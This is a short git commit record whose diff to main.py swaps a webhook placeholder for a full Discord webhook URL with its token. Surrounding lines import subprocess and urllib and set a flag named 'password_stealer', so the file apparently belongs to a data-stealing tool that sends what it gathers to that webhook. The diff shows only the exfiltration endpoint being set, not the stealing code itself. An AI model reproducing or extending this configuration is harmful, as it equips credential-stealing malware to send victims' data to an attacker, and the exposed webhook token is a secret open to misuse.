7a1552b91a6a66a39e1fcebd87c010c01fa2a1ed
lokimango <109480306+lokimango@users.noreply.github.com>
2022-07-19 14:51:15 +0200

    Update main.py

--- main.py
+++ main.py
@@ -11,7 +11,7 @@ from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
 
-webhook_url = "YOUR_WEBHOOK_HERE"
+webhook_url = "https://discord.com/api/webhooks/998933791177457754/H4pYhDr49o163J4p0nJSZRfx3yNEl2ea0_VNzJgmuePzMMhgQy8rhWH4_m8GoybzA3yf"
 password_stealer = False
 
 languages = {
